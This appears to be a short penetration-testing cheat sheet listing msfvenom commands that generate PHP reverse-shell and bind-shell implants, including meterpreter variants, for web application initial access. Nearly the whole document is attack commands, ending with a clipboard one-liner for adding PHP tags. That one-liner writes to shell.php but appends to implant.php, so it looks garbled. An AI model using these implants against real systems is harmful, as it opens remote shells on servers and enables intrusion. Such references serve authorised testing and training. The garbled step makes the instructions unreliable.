---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - initial-access
  - cross-platform
  - metasploit-framework
---
# PHP

## Reverse Shells

### Generate via `msfvenom`

Staged PHP reverse shell.

```
$ msfvenom -p php/reverse_php lhost=<IP> lport=<PORT> -f raw -o implant.php
```

Staged PHP with perl reverse shell.

```
$ msfvenom -p php/reverse_perl lhost=<IP> lport=<PORT> -f raw -o implant.php
```

Staged PHP `meterpreter` reverse shell.

```
$ msfvenom -p php/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o implant.php
```

Stageless PHP `meterpreter` reverse shell.

```
$ msfvenom -p php/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f raw > implant.php
```

## Bind Shells

### Generate via `msfvenom`

Staged PHP bind shell.

```
$ msfvenom -p php/bind_php lhost=<IP> lport=<PORT> -f raw -o implant.php
```

Staged PHP with perl bind shell.

```
$ msfvenom -p php/bind_perl lport=<PORT> -f raw -o implant.php
```

Staged PHP `meterpreter` bind shell.

```
$ msfvenom -p php/meterpreter/bind_tcp lport=<PORT> -f raw -o implant.php
```

Stageless PHP `meterpreter` bind callback shell

```
$ msfvenom -p php/meterpreter_bind_tcp lport=<PORT> -f raw -o implant.php
```

## Properly Executed

After generating the PHP implant include the tags to ensure execution.

```
$ xclip -selection clipboard implant.php && echo '<?php ' | tr -d '\n' > shell.php && xclip -selection clipboard -o >> implant.php
```